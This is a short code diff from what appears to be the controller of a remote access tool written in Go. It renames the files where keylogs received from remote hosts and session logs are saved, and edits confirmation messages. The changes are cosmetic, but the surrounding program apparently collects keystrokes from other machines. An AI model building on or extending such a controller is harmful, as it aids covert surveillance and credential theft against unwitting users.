@@ -162,7 +162,7 @@ func handleClient(client *Connection) {
 			case "<LOG>":
 				data := readAll("<END>")
 				os.WriteFile(fmt.Sprintf("%v@keylog.log", selected.hostname), []byte(data), 0644)
-				dialog.NewInformation("Keylog Saved!", fmt.Sprintf("Keylog saved in '%v@keylog.log'", selected.hostname), myWindow).Show()
+				dialog.NewInformation("Keylog Saved!", fmt.Sprintf("Keylog saved in '%v@keylog.log'.", selected.hostname), myWindow).Show()
 				exec.Command("explorer.exe", ".\\").Start()
 
 			case "<DOWNLOAD>":
@@ -540,8 +540,8 @@ func main() {
 				widget.NewLabelWithStyle("Logs", fyne.TextAlignCenter, fyne.TextStyle{Bold: true}),
 				Display,
 				widget.NewCard("", "", widget.NewButton("Save Log", func() {
-					os.WriteFile(fmt.Sprintf("logs@%v.log", time.Now().Format("02.01")), []byte(Display.Text), 0644)
-					dialog.NewInformation("Log Saved!", fmt.Sprintf("Log saved in 'logs@%v.log'", time.Now().Format("02.01")), myWindow).Show()
+					os.WriteFile(fmt.Sprintf("%v@logs.log", time.Now().Format("02.01")), []byte(Display.Text), 0644)
+					dialog.NewInformation("Log Saved!", fmt.Sprintf("Log saved in '%v@logs.log'.", time.Now().Format("02.01")), myWindow).Show()
 					exec.Command("explorer.exe", ".\\").Start()
 				})),
 			),
